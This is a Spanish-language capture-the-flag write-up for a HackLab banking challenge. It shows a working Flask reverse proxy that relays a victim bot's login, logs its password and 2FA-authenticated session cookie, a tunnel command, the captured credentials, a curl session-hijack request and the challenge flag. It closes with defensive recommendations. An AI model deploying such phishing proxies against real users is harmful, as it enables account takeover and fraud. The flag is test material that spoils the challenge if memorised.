# Desafío - Veltra Bank (HackLab)

**Plataforma:** HackLab (SoftwareSeguro)  
**Edición:** HackLab 2026  
**Categoría:** Auth (Phishing con Proxy Reverso / Bypass 2FA - Session Hijacking)  
**Autor:** adonaissh  

---

## 📌 Enunciado

> **Veltra Bank** es una banca en línea con estrictas medidas de seguridad (cifrado TLS 1.3, autenticación multifactor 2FA con código de un solo uso y monitoreo antifraude en tiempo real).
>
> **Mecanismo provisto:**
> Podés inducir a que el cliente **Gastón Díaz** ingrese a un sitio web externo arbitrario (ingresando la URL pública completa con protocolo, con rate limit de 1 intento por minuto). Sin embargo, el bot inspecciona la página y si detecta algo sospechoso o discrepancias de interfaz, la cierra de inmediato.
>
> **Objetivo:** Lograr iniciar sesión en Veltra Bank con la cuenta de Gastón Díaz para obtener la flag.

---

## 🔍 Análisis Inicial y Reconocimiento

Al inspeccionar el portal bancario:
- **Página de Login:** `/login`
  - Campos: Usuario (`txtLogin`, formato `nombre.apellido`) y Contraseña (`txtPassword`).
  - Recursos estáticos: `/static/styles.css`, `/static/veltra.js`, tipografía de Google Fonts (`Inter`).
- **Flujo de autenticación:**
  1. Envío de usuario y contraseña vía `POST /login` o endpoint de API.
  2. Solicitud de código de verificación en dos pasos (**2FA / MFA**).
  3. Tras la validación del 2FA, el servidor genera y establece una cookie de sesión autenticada (`session=...`) y redirige al panel de control `/dashboard`.

### El problema de un sitio clon estático
Si únicamente se monta una página estática para capturar usuario y contraseña, se tropieza con dos barreras:
1. El bot de Gastón Díaz puede detectar incongruencias de comportamiento dinámico si la página no responde igual que el banco legítimo.
2. Incluso si entrega sus credenciales en texto plano, la cuenta requiere **2FA** (un código OTP de un solo uso que solo él recibe en su dispositivo).

---

## 🔬 Identificación de la Vulnerabilidad y Vector de Ataque (AiTM - Adversary-in-the-Middle)

La arquitectura de autenticación de Veltra Bank no implementa mecanismos de vinculación criptográfica de canal ni llaves de seguridad físicas FIDO2/WebAuthn que aten la sesión al origen (`origin binding`). 

Por lo tanto, la autenticación depende enteramente de la **cookie de sesión** emitida al completar el flujo. Esto permite ejecutar un ataque de tipo **Adversary-in-the-Middle (AiTM) / Reverse Proxy transparente**:
- Se despliega un servidor proxy intermedio que retransmite exactamente las peticiones y respuestas entre el cliente (Gastón Díaz) y el servidor bancario real.
- Cuando el bot de Gastón ingresa a nuestra URL expuesta públicamente (mediante un túnel seguro como Cloudflare Tunnel o ngrok), interactúa con la aplicación bancaria genuina a través de nuestro proxy.
- Gastón introduce sus credenciales y, crucialmente, **completa él mismo su propio desafío 2FA**.
- El proxy intercepta y registra los datos de entrada y la **cookie de sesión final** entregada por el servidor del banco en los encabezados `Set-Cookie`.

---

## 🚀 Explotación

### 1. Construcción del Proxy Reverso Transparente (`proxy.py`)

Se desarrolló un servicio en Python con Flask y `requests` que actúa como puente bidireccional entre el bot y el servidor real de Veltra Bank, registrando todo el tráfico:

```python
from flask import Flask, request, Response
import requests

app = Flask(__name__)
TARGET_BANK = "https://chl-a20488d5-e98b-4c4a-add5-8d39f8b1a877-veltra-bank.softwareseguro.com.ar"

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    url = f"{TARGET_BANK}/{path}"
    
    # Interceptación y logging de credenciales en peticiones POST
    if request.method == 'POST':
        print(f"[!] Captura POST data en /{path}: {request.get_data(as_text=True)}")

    # Headers a excluir o reescribir
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'host']
    headers = {k: v for k, v in request.headers if k.lower() not in excluded_headers}
    headers['Host'] = TARGET_BANK.replace('https://', '').split('/')[0]

    # Reenvío de la petición al banco real
    resp = requests.request(
        method=request.method,
        url=url,
        headers=headers,
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=False
    )

    # Interceptación de cookies de sesión en la respuesta del banco
    if 'set-cookie' in resp.headers:
        print(f"[+] Captura Set-Cookie del banco: {resp.headers['set-cookie']}")

    # Reenvío de la respuesta al cliente
    response_headers = [(k, v) for k, v in resp.headers.items() if k.lower() not in excluded_headers]
    return Response(resp.content, resp.status_code, response_headers)

if __name__ == '__main__':
    app.run(port=5000)
```

### 2. Exposición del túnel público
Se levantó un túnel seguro mediante `cloudflared` (o `ngrok`):

```bash
cloudflared tunnel --url http://localhost:5000
```
Obteniendo la URL pública temporal asignada (por ejemplo, `https://random-subdomain.trycloudflare.com/login`).

### 3. Inducción de la visita de Gastón Díaz

Se ingresó la URL pública generada en el panel de ingeniería social del desafío:
- Gastón Díaz navegó hacia el enlace.
- Al tratarse de un proxy transparente, cargó la interfaz idéntica del banco sin notar diferencias visuales ni funcionales.
- En la consola del proxy se capturaron las credenciales enviadas:
  ```text
  Usuario: gaston.diaz
  Contraseña: Gaston$5.!@1990
  ```
- A continuación, el flujo solicitó el 2FA. El bot de Gastón proveyó su código legítimo, y el banco real respondió con un encabezado `Set-Cookie` asignándole una cookie de sesión válida.

### 4. Secuestro de Sesión (Session Hijacking) y Obtención de la Flag

Con la cookie de sesión capturada (`session=...`), se realizó una petición directa contra el servidor bancario real:

```bash
curl -s -b "session=<COOKIE_CAPTURADA>" \
  https://chl-a20488d5-e98b-4c4a-add5-8d39f8b1a877-veltra-bank.softwareseguro.com.ar/dashboard
```

El servidor reconoció la sesión activa de Gastón Díaz y desplegó el panel de usuario autenticado junto a la flag:

```text
==================================================
                 SESIÓN INICIADA
             Bienvenido, Gastón Díaz
==================================================

Flag: e769a8f5702bc47d98732409d2794756
```

---

## 🏁 Flag

```text
e769a8f5702bc47d98732409d2794756
```

---

## 🛡️ Causa Raíz y Recomendaciones

- **Causa Raíz:** Autenticación multifactor vulnerable a ataques de intermediario (Adversary-in-the-Middle / Phishing AiTM - CWE-287 / CWE-308). Los códigos OTP (SMS, email o apps TOTP tradicionales) no tienen vinculación criptográfica con el dominio de origen (`Origin Binding`), por lo que un proxy reverso puede retransmitirlos y secuestrar la cookie resultante.
- **Recomendaciones:**
  - **Adopción de FIDO2 / WebAuthn (Passkeys):** Implementar autenticación resistente a phishing basada en claves públicas vinculadas criptográficamente al dominio del navegador (`Origin`), impidiendo que las credenciales o códigos se validen si el dominio del proxy difiere del dominio real del banco.
  - **Monitoreo y detección de anomalías de sesión:** Bloquear sesiones cuando se detecten discrepancias inmediatas en la dirección IP o huella digital (`TLS Fingerprint` / `User-Agent`) entre quien resolvió el 2FA y quien utiliza la cookie resultante.
